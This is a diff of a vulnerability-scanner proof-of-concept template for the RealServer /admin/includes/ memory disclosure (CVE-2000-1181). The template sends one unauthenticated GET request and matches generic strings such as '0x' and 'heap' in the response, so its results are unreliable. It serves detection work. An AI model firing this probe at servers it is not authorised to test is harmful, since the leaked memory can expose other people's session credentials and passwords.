@@ -1,29 +1,57 @@
 [info]
 author = "ave"
-description = "Real Networks RealServer 7 及更早版本管理接口 /admin/includes/ 存在敏感信息泄露漏洞。远程攻击者无需身份认证即可通过 HTTP GET 请求访问该路径，服务器会返回运行时内存中的随机数据，可能包含会话凭证、Cookie、用户名密码等敏感信息。"
+description = "检测 RealServer /admin/includes/ URL 内存内容泄露漏洞"
 id = "POC-AVE-2000-0836"
-name = "Real Networks RealServer Memory Contents Disclosure PoC"
+name = "CVE-2000-1181 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-1181",
-    "realserver",
-    "memory-disclosure",
-]
+tags = ["ave-2000-0836"]
 vuln_id = [
     "CVE-2000-1181",
     "AVE-2000-0836",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
 path = "/admin/includes/"
 protocol = "http"
 
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
 [[poc.requests.matchers]]
 expect = true
 part = "body"
-status = [200]
-type = "status"
+type = "word"
+words = [
+    "0x",
+    "0X",
+    "memory",
+    "Memory",
+    "stack",
+    "Stack",
+    "heap",
+    "Heap",
+    "0x00",
+    "0x01",
+    "0x02",
+    "0x03",
+    "0x04",
+    "0x05",
+    "0x06",
+    "0x07",
+    "0x08",
+    "0x09",
+    "0x0a",
+    "0x0b",
+    "0x0c",
+    "0x0d",
+    "0x0e",
+    "0x0f",
+]
